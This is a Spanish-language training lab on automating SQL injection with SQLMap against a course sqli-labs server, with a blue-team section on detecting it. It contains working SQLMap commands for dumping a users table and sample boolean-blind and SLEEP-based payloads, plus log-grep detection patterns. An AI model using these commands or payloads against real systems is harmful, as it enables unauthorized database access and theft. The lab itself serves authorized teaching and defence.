🤖 Laboratorio: SQLMap — Automatización de SQL Injection (Red & Blue Team)

Este laboratorio demuestra cómo SQLMap automatiza exactamente lo que hiciste manualmente en el laboratorio anterior. No es una herramienta mágica: es un script que envía los mismos payloads que construiste a mano, solo que más rápido y de forma sistemática.

El objetivo no es aprender a usar SQLMap como caja negra. Es reconocer en su output los mismos patrones que ya entiendes, y entender por qué la automatización no reemplaza el conocimiento manual — lo amplifica.

⚠️ Regla del laboratorio: SQLMap solo se usa en este laboratorio contra el servidor del curso http://159.112.137.106/sqli-labs/. Ejecutar SQLMap contra cualquier otro sistema sin autorización escrita es ilegal en la mayoría de jurisdicciones, independientemente de si el sistema parece vulnerable.

📖 Concepto Previo: Qué es SQLMap y Qué Hace por Dentro

SQLMap es una herramienta open source escrita en Python que automatiza la detección y explotación de vulnerabilidades SQL Injection. No tiene ningún poder especial: envía requests HTTP con payloads SQL, analiza las respuestas y repite el proceso sistemáticamente hasta extraer lo que busca.

Internamente, SQLMap hace exactamente lo mismo que hiciste a mano en el laboratorio anterior, en este orden:

1. Detecta el delimitador: Prueba comilla simple, comilla doble, paréntesis y combinaciones hasta encontrar cuál rompe la consulta y cuál la cierra correctamente. Tú hiciste esto en los Pasos 1, 2 y 3 de Less-1.

2. Identifica la técnica disponible: Prueba si hay canal visual (Union-based), si hay errores (Error-based), si hay diferencia en la respuesta (Boolean Blind) o si solo hay diferencia en el tiempo (Time-based). Aplica la técnica más eficiente disponible.

3. Enumera el esquema: Consulta information_schema para listar bases de datos, tablas y columnas. Exactamente las mismas consultas que construiste en los Pasos 7 y 8 del laboratorio anterior.

4. Extrae los datos: Usa GROUP_CONCAT, LIMIT/OFFSET o búsqueda binaria (según la técnica) para volcar el contenido de las tablas. El mismo proceso que tu script Python hacía carácter por carácter en Less-8.

💡 La diferencia clave: SQLMap hace todo esto en segundos y maneja automáticamente casos borde, encodings, WAFs básicos y variaciones de respuesta. Un humano tarda minutos o horas en el mismo proceso. Pero si no entiendes qué hace cada paso, no puedes interpretar sus resultados ni adaptarlo cuando falla.

🔧 Instalación y Verificación

SQLMap viene preinstalado en Kali Linux. Si estás en otro sistema: 

# Verificar que está instalado
sqlmap --version
# Resultado esperado: sqlmap/1.7.x#stable

# Si no está instalado
sudo apt install sqlmap -y

# Alternativa: clonar desde GitHub (versión más reciente)
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version

🔴 PARTE 1 — Detección y Enumeración Básica (Less-1)

Empezamos con Less-1 porque ya sabes exactamente qué hay ahí: delimitador comilla simple, 3 columnas, base de datos security, tabla users. Vas a ver cómo SQLMap llega a las mismas conclusiones automáticamente.

Paso 1 — Detectar si el parámetro es inyectable

El flag --batch hace que SQLMap use las opciones por defecto en cada pregunta sin esperar confirmación del usuario. Útil para laboratorio; en un pentest real conviene revisar cada decisión. 

sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" --batch

SQLMap va a mostrar algo como esto en su output:

[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 3 columns' injectable

Observa la última línea: SQLMap detectó automáticamente que la consulta tiene 3 columnas. Tú tardaste 4 requests con ORDER BY para llegar a esa conclusión. SQLMap lo hace en el mismo proceso de detección.

Paso 2 — Listar bases de datos disponibles

sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" --dbs --batch

Aparecen 4 bases de datos. information_schema y mysql son del sistema. security es la de sqli-labs. challenges es otra base de datos del servidor. El atacante real exploraría todas.

🔴 PARTE 2 — Técnicas Específicas con Verbose (Less-8 y Less-9)

Esta es la parte más importante del laboratorio. Vas a forzar a SQLMap a usar solo la técnica que practicaste manualmente y ver los payloads exactos que envía. Reconocerás los mismos patrones de tu script Python.

Paso 1 — Boolean Blind contra Less-8 con payloads visibles

El flag --technique=B limita SQLMap a Boolean-based Blind únicamente. El flag -v 3 muestra cada payload que envía en tiempo real. 

sqlmap -u "http://159.112.137.106/sqli-labs/Less-8/?id=1" \
  --technique=B \
  -D security -T users --dump \
  --batch \
  -v 3

Con -v 3 verás en el output algo como esto para cada carácter que extrae: 

[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
FROM security.users ORDER BY id LIMIT 0,1),1,1))>64
[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
FROM security.users ORDER BY id LIMIT 0,1),1,1))>96
[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
FROM security.users ORDER BY id LIMIT 0,1),1,1))>112
[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
FROM security.users ORDER BY id LIMIT 0,1),1,1))>68
[PAYLOAD] 1 AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20)
FROM security.users ORDER BY id LIMIT 0,1),1,1))>68

Reconoces el patrón: ORD(MID(...)) es equivalente a ASCII(SUBSTRING(...)) que usaste en tu script Python. SQLMap compara el valor numérico del carácter usando búsqueda binaria, exactamente como implementaste manualmente. La diferencia es que SQLMap optimiza el número de requests y maneja automáticamente los casos borde.

Paso 2 — Time-Based Blind contra Less-9

sqlmap -u "http://159.112.137.106/sqli-labs/Less-9/?id=1" \
  --technique=T \
  --current-db \
  --batch \
  -v 3

Con -v 3 verás los payloads con SLEEP:

[PAYLOAD] 1 AND SLEEP(5)
[PAYLOAD] 1' AND SLEEP(5) AND 'abc'='abc
[PAYLOAD] 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
...
💡 Por qué time-based es más lento en SQLMap: SQLMap usa por defecto SLEEP(5) para time-based. Para extraer un solo carácter necesita múltiples requests de 5 segundos cada uno. Extraer la tabla users completa por time-based puede tardar varios minutos. Boolean-based es siempre preferible cuando está disponible porque no depende del tiempo de respuesta.

🔴 PARTE 3 — Información del Sistema

SQLMap puede extraer información del servidor MySQL más allá de los datos de la aplicación. Esta información es valiosa en un pentest para entender el alcance del compromiso.

Extraer información del motor en un solo comando

sqlmap -u "http://159.112.137.106/sqli-labs/Less-1/?id=1" \
  --current-user \
  --current-db \
  --banner \
  --batch

Resultado esperado:

[INFO] fetching banner
[INFO] fetching current user
[INFO] fetching current database

web server operating system: Linux Ubuntu
web application technology: Apache 2.4, PHP 5.5
back-end DBMS: MySQL >= 5.0
banner: '5.7.x-log'
current user: 'root@localhost'
current database: 'security'
⚠️ Punto crítico para el debate Blue Team: El current user es root@localhost. Esto significa que la aplicación web se conecta a MySQL con el usuario root, que tiene privilegios totales sobre todas las bases de datos del servidor. Un atacante con este nivel de acceso puede leer cualquier base de datos, escribir archivos al sistema y potencialmente ejecutar comandos del sistema operativo. Este es exactamente el escenario que el principio de mínimo privilegio previene.

Construye tú solo el comando SQLMap que cumpla estas tres condiciones al mismo tiempo, sin consultar los pasos anteriores:

  • Usar Less-8 como objetivo (Boolean Blind)
  • Extraer únicamente la contraseña del usuario batman
  • Mostrar los payloads en tiempo real

  --batch \
  -v 3

🔵 Blue Team: Cómo Detectar SQLMap en la Red

SQLMap genera patrones de tráfico muy característicos que un Blue Team bien configurado puede detectar en tiempo real.

Señal 1 — User-Agent por defecto

SQLMap envía por defecto un User-Agent que lo identifica explícitamente: 

User-Agent: sqlmap/1.7.x (https://sqlmap.org)

Cualquier WAF o regla de IDS que filtre este string bloqueará SQLMap inmediatamente. Los atacantes más sofisticados usan --random-agent para evitar esto, pero es el punto de detección más fácil.

Señal 2 — Volumen de requests en ráfaga

SQLMap puede generar cientos de requests en pocos segundos contra el mismo parámetro. Una regla de rate limiting que dispare alerta cuando una IP supera 50 requests por minuto al mismo endpoint es suficiente para detectarlo.

Señal 3 — Payloads característicos en los logs

El access log del servidor web registra cada URL solicitada. Los payloads de SQLMap son reconocibles: AND SLEEP(5), ORDER BY incrementales, UNION SELECT NULL, information_schema en parámetros. 

# Buscar en access log señales de SQLMap
grep -i "sleep\|union\|information_schema\|order by" /var/log/apache2/access.log

# Contar requests por IP en el último minuto
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head

Medidas defensivas específicas contra SQLMap

Medida Qué bloquea Limitación
Filtrar User-Agent de SQLMap SQLMap sin modificar SQLMap con --random-agent lo evita
Rate limiting por IP Ráfagas automáticas SQLMap con --delay lo evita
WAF con reglas OWASP CRS Payloads conocidos SQLMap con --tamper puede evadirlo
Prepared Statements en el código Toda SQLi, incluyendo SQLMap Ninguna — es la única defensa absoluta

💡 Lecciones Aprendidas

  • SQLMap hace lo mismo que hiciste manualmente, más rápido: Los payloads que ves con -v 3 son variaciones de los mismos patrones que construiste en Less-8. La herramienta no tiene magia; tiene automatización.
  • El conocimiento manual es prerequisito, no alternativa: Sin entender qué hace cada payload, no puedes interpretar los resultados de SQLMap, adaptarlo cuando falla, ni explicar el hallazgo a un cliente en un informe de pentest.
  • SQLMap es más detectable que el ataque manual: El volumen de requests en ráfaga y el User-Agent por defecto lo hacen fácilmente identificable por cualquier sistema de monitoreo básico.
  • La única defensa que detiene SQLMap completamente son los Prepared Statements: Rate limiting, WAFs y filtros de User-Agent son mitigaciones parciales. Si el código no concatena input en SQL, SQLMap no tiene nada que explotar.
  • El usuario de base de datos importa: Que SQLMap encuentre current-user: root significa que un atacante real tendría acceso total al servidor de base de datos, no solo a la aplicación. El principio de mínimo privilegio en la conexión de base de datos limita este riesgo.
